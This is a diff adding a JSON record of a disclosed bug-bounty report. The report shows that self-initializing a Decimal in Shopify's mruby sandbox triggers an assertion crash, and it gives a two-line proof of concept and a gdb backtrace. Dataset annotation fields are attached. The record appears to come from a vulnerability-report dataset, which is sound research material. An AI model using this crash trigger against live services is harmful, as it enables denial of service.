@@ -1,0 +1,38 @@
+{
+  "reported_to": "shopify-scripts",
+  "reported_by": "brakhane ",
+  "title": "Crash: Initialize Decimal with itself triggers an assertion",
+  "content": "\nWhen Decimal is initialized with itself, a new (empty) mpd_t will be created. To fill it with a value, to_s of the current instance is called, which accesses the empty mpd_t. This triggers an assertion, which leads to a crash.\nPatch\nI've created and attached a simple patch which just returns self when a Decimal is initialized with itself. Pretty simple, but should do the job (careful: I've created the patch after a 20h flight, could be... uhm, suboptimal).\nPoC\nPoC does work on https://www.mruby.science/runs, but as it's not up2date that shouldn't really mean anything.\nCode 30 Bytes\n1a = Decimal.new\n2a.initialize a\nTrace\nCode 5.03 KiB\n1$ gdb attach 10251\n2GNU gdb (GDB) 7.12\n3Copyright (C) 2016 Free Software Foundation, Inc.\n4License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\n5This is free software: you are free to change and redistribute it.\n6There is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\n7and \"show warranty\" for details.\n8This GDB was configured as \"x86_64-pc-linux-gnu\".\n9Type \"show configuration\" for configuration details.\n10For bug reporting instructions, please see:\n11<http://www.gnu.org/software/gdb/bugs/>.\n12Find the GDB manual and other documentation resources online at:\n13<http://www.gnu.org/software/gdb/documentation/>.\n14For help, type \"help\".\n15Type \"apropos word\" to search for commands related to \"word\"...\n16attach: No such file or directory.\n17Attaching to process 10251\n18Reading symbols from /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/build/host/bin/mirb...done.\n19Reading symbols from /usr/lib/libm.so.6...(no debugging symbols found)...done.\n20Reading symbols from /usr/lib/libreadline.so.7...(no debugging symbols found)...done.\n21Reading symbols from /usr/lib/libncursesw.so.6...(no debugging symbols found)...done.\n22Reading symbols from /usr/lib/libc.so.6...(no debugging symbols found)...done.\n23Reading symbols from /lib64/ld-linux-x86-64.so.2...(no debugging symbols found)...done.\n240x00007f8de487f131 in pselect () from /usr/lib/libc.so.6\n25(gdb) c\n26Continuing.\n27\n28Program received signal SIGABRT, Aborted.\n290x00007f8de47d104f in raise () from /usr/lib/libc.so.6\n30(gdb) bt\n31#0  0x00007f8de47d104f in raise () from /usr/lib/libc.so.6\n32#1  0x00007f8de47d247a in abort () from /usr/lib/libc.so.6\n33#2  0x00007f8de47c9ea7 in __assert_fail_base () from /usr/lib/libc.so.6\n34#3  0x00007f8de47c9f52 in __assert_fail () from /usr/lib/libc.so.6\n35#4  0x000000000045a356 in mpd_msword (dec=0xa75980) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/mpdecimal.c:218\n36#5  mpd_iszero (dec=dec@entry=0xa75980) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/mpdecimal.c:331\n37#6  0x0000000000472fc0 in mpd_qformat_spec (dec=dec@entry=0xa75980, spec=spec@entry=0x7ffc8fdcd220, ctx=ctx@entry=0x9f8580, \n38    status=status@entry=0x7ffc8fdcd28c) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/io.c:1320\n39#7  0x00000000004738d5 in mpd_qformat (dec=0xa75980, fmt=fmt@entry=0x481177 \"f\", ctx=0x9f8580, status=status@entry=0x7ffc8fdcd28c)\n40    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/io.c:1390\n41#8  0x000000000045602a in ext_decimal_to_s (state=0x9b1010, rself=...)\n42    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/ext.c:220\n43#9  0x000000000040f6af in mrb_funcall_with_block (mrb=mrb@entry=0x9b1010, self=..., mid=<optimized out>, mid@entry=38, argc=<optimized out>, \n44    argc@entry=0, argv=argv@entry=0x0, blk=..., blk@entry=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:407\n45#10 0x000000000040fbcc in mrb_funcall_argv (mrb=mrb@entry=0x9b1010, self=..., self@entry=..., mid=mid@entry=38, argc=argc@entry=0, argv=argv@entry=0x0)\n46    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:424\n47#11 0x0000000000403d23 in convert_type (raise=1 '\\001', method=0x4810cd \"to_s\", tname=0x4813ea \"String\", val=..., mrb=0x9b1010)\n48    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/object.c:316\n49#12 mrb_convert_type (mrb=mrb@entry=0x9b1010, val=..., type=type@entry=MRB_TT_STRING, tname=tname@entry=0x4813ea \"String\", \n50    method=method@entry=0x4810cd \"to_s\") at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/object.c:338\n51#13 0x0000000000455927 in ext_decimal_initialize (state=0x9b1010, self=...)\n52    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/ext.c:86\n53#14 0x000000000041150f in mrb_vm_exec (mrb=mrb@entry=0x9b1010, proc=<optimized out>, proc@entry=0x9b9020, pc=<optimized out>)\n54    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n55#15 0x0000000000416d57 in mrb_vm_run (mrb=mrb@entry=0x9b1010, proc=proc@entry=0x9b9020, self=..., stack_keep=stack_keep@entry=2)\n56    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n57#16 0x00000000004028be in main (argc=<optimized out>, argv=<optimized out>)\n58    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549\n59(gdb) info registers\n60rax            0x0\t0\n61rbx            0x6\t6\n62rcx            0x7f8de47d104f\t140247400517711\n63rdx            0x0\t0\n64rsi            0x7ffc8fdccc30\t140722722098224\n65rdi            0x2\t2\n66rbp            0x4ac565\t0x4ac565\n67rsp            0x7ffc8fdccca8\t0x7ffc8fdccca8\n68r8             0x0\t0\n69r9             0x7ffc8fdccc30\t140722722098224\n70r10            0x8\t8\n71r11            0x246\t582\n72r12            0xda\t218\n73r13            0x4acbb8\t4901816\n74r14            0x0\t0\n75r15            0x7ffc8fdcd220\t140722722099744\n76rip            0x7f8de47d104f\t0x7f8de47d104f <raise+207>\n77eflags         0x246\t[ PF ZF IF ]\n78cs             0x33\t51\n79ss             0x2b\t43\n80ds             0x0\t0\n81es             0x0\t0\n82fs             0x0\t0\n83gs             0x0\t0\n84(gdb) \n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": 10000,
+  "weaknesses": [
+    "None"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1481937840,
+  "report_url": "https://hackerone.com/reports/185775",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "a = Decimal.new"
+    ],
+    [
+      2,
+      "a.initialize a"
+    ]
+  ],
+  "vuln_description": "When Decimal is initialized with itself, a new (empty) mpd_t is created. Attempting to fill it with a value by calling to_s on the current instance accesses the empty mpd_t, triggering an assertion and causing a crash.",
+  "reason": "The vulnerability involves a simple self-initialization scenario with a straightforward reproduction path. The interaction between initialization and string conversion is somewhat subtle but not deeply complex.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null
+}
